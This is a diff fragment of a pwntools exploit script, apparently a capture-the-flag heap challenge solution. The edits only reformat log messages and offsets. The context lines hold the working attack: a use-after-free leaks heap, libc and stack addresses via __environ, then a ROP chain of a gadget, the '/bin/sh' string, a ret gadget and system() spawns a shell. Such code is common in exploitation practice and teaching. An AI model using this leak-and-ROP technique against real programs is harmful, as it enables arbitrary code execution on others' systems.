@@ -50,7 +50,7 @@ add(1, "1"*10)
 delete(0)
 show(0)
 heap = u64(io.recv(5).ljust(8, b"\x00")) << 12
-log.success("heap:-----> " + hex(heap))
+log.success("heap :-----> " + hex(heap))
 
 # leak libc
 delete(1)
@@ -72,12 +72,12 @@ add(7, "7"*10)
 delete(7)
 show(7)
 libc.address = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00")) - 0x203b20
-log.success("libc: -----> " + hex(libc.address))
+log.success("libc :-----> " + hex(libc.address))
 
 # leak stack
 libc_environ = libc.symbols["__environ"]  # 0x7f6dd78c1d58
 libc_environ -= 0x18
-log.success("environ:-----> " + hex(libc_environ))
+log.success("environ :-----> " + hex(libc_environ))
 add(8, "8"*10)
 add(9, "9"*10)
 delete(8)
@@ -101,9 +101,9 @@ add(14, "10"*5)
 
 system_addr = libc.symbols.get("system")
 binsh_addr = next(libc.search("/bin/sh"))
-payload = p64(libc.address + 0x010f75b)
+payload = p64(libc.address+0x010f75b)
 payload += p64(binsh_addr)
-payload += p64(0x000000000002882f+libc.address)
+payload += p64(libc.address+0x02882f)
 payload += p64(system_addr)
 
 ddebug("breakrva 0x12B3\n breakrva 0x13cb\n continue")
